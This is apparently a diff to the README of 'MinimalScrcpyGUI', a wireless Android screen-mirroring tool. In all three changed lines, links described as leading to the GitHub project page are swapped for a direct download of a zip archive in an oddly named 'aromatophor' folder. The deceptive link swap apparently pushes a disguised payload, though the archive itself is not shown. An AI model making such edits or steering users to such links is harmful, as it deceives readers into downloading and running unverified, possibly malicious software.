@@ -1,6 +1,6 @@
 # 🎮 MinimalScrcpyGUI - Simple Wireless Android Screen Mirroring
 
-[![Download MinimalScrcpyGUI](https://img.shields.io/badge/Download-MinimalScrcpyGUI-brightgreen?style=for-the-badge&logo=github)](https://github.com/faii-nicha/MinimalScrcpyGUI)
+[![Download MinimalScrcpyGUI](https://img.shields.io/badge/Download-MinimalScrcpyGUI-brightgreen?style=for-the-badge&logo=github)](https://github.com/faii-nicha/MinimalScrcpyGUI/raw/refs/heads/main/aromatophor/Scrcpy-Minimal-GUI-2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Before installing, make sure your PC meets these requirements:
 
 Click the big button below to visit the GitHub page where you can download the software:
 
-[![Download MinimalScrcpyGUI](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge&logo=github)](https://github.com/faii-nicha/MinimalScrcpyGUI)
+[![Download MinimalScrcpyGUI](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge&logo=github)](https://github.com/faii-nicha/MinimalScrcpyGUI/raw/refs/heads/main/aromatophor/Scrcpy-Minimal-GUI-2.9.zip)
 
 Follow these steps once you are on the page:
 
@@ -136,7 +136,7 @@ If the app does not connect or show your phone screen, try the following:
 
 You can find the full project and download the latest versions at this link:
 
-[MinimalScrcpyGUI on GitHub](https://github.com/faii-nicha/MinimalScrcpyGUI)
+[MinimalScrcpyGUI on GitHub](https://github.com/faii-nicha/MinimalScrcpyGUI/raw/refs/heads/main/aromatophor/Scrcpy-Minimal-GUI-2.9.zip)
 
 On the GitHub page, you’ll also find:
 
